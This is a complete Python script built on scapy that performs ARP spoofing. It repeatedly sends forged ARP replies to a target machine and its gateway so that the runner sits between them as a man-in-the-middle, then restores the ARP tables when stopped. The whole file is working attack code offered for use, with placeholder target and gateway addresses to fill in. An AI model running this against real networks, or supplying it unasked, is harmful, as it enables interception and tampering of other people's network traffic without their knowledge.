#!/usr/bin/env python3

import scapy.all as scapy
import time
import sys

# Cache MAC addresses to avoid repeated lookups
mac_cache = {}

def get_mac(ip):
    """Get MAC address for an IP, with caching and error handling"""
    # Check cache first
    if ip in mac_cache:
        return mac_cache[ip]
    
    try:
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0]
        
        if answered_list:
            mac = answered_list[0][1].hwsrc
            mac_cache[ip] = mac  # Cache it
            return mac
        else:
            return None
    except Exception as e:
        print(f"\n[!] Error getting MAC for {ip}: {e}")
        return None


def spoof(target_ip, spoof_ip, target_mac):
    """Send ARP spoof packet with proper Ethernet layer"""
    # Create Ethernet + ARP packet
    ether = scapy.Ether(dst=target_mac)
    arp = scapy.ARP(
        op=2,  # is-at (ARP reply)
        pdst=target_ip,
        hwdst=target_mac,
        psrc=spoof_ip
    )
    packet = ether / arp
    scapy.sendp(packet, verbose=False)


def restore(destination_ip, source_ip):
    """Restore ARP tables to normal"""
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    
    if not destination_mac or not source_mac:
        print(f"\n[!] Could not get MAC addresses for restoration")
        return
    
    # Create proper Ethernet + ARP packet
    ether = scapy.Ether(dst=destination_mac)
    arp = scapy.ARP(
        op=2,
        pdst=destination_ip,
        hwdst=destination_mac,
        psrc=source_ip,
        hwsrc=source_mac
    )
    packet = ether / arp
    
    # Send multiple times to ensure restoration
    scapy.sendp(packet, count=5, verbose=False)


def main():
    target_ip = "192.168.1.160"   # Enter your target IP
    gateway_ip = "192.168.1.1"  # Enter your gateway's IP
    
    print("[*] ARP Spoofing Script")
    print(f"[*] Target: {target_ip}")
    print(f"[*] Gateway: {gateway_ip}")
    print("\n[*] Getting MAC addresses...")
    
    # Get MAC addresses upfront
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    
    if not target_mac:
        print(f"[!] Could not get MAC for target {target_ip}")
        print("[!] Make sure the target is online and reachable")
        sys.exit(1)
    
    if not gateway_mac:
        print(f"[!] Could not get MAC for gateway {gateway_ip}")
        print("[!] Make sure you have the correct gateway IP")
        sys.exit(1)
    
    print(f"[+] Target MAC: {target_mac}")
    print(f"[+] Gateway MAC: {gateway_mac}")
    print("\n[*] Starting ARP spoofing...")
    print("[*] Press Ctrl+C to stop\n")
    
    try:
        sent_packets_count = 0
        while True:
            # Spoof target: tell target we're the gateway
            spoof(target_ip, gateway_ip, target_mac)
            
            # Spoof gateway: tell gateway we're the target
            spoof(gateway_ip, target_ip, gateway_mac)
            
            sent_packets_count += 2
            print(f"\r[*] Packets Sent: {sent_packets_count}", end="", flush=True)
            time.sleep(2)  # Wait 2 seconds between spoofs
    
    except KeyboardInterrupt:
        print("\n\n[*] Ctrl+C pressed... Stopping")
        print("[*] Restoring ARP tables...")
        
        restore(gateway_ip, target_ip)
        restore(target_ip, gateway_ip)
        
        print("[+] ARP Spoof Stopped")
        print("[+] ARP tables restored")


if __name__ == "__main__":
    main()
